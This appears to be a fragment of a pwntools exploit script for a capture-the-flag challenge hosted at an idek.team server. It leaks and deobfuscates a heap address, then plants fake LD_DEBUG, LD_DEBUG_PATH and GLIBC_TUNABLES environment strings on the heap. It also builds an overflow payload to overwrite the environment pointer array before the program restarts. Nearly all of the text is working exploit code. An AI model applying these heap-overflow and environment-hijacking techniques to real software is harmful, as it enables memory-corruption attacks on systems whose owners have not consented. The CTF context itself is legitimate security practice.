...
#p = process(e.path)
p = remote('minkymomo.chal.idek.team', 1337)
...
heap = deobf(u64(rd(0).ljust(8, b'\x00'))) - 0x12d0 
log.info('Heap adr: ' + hex(heap))

#set fake env vars on heap

add(2, 0x37, b'LD_DEBUG=files')
add(3, 0x37, b'LD_DEBUG_PATH=/proc/self/fd/1')
add(4, 0x37, b'GLIBC_TUNABLES=glibc.malloc.tcache_count=2')

#use overflow overwrite env then restart with new env set

s = p64(heap + 0x12b0 + 0x40)
s += p64(heap + 0x12b0 + 0x40 + 0x40)
s += p64(heap + 0x12b0 + 0x40 + 0x40 * 2)
s += p64(0)
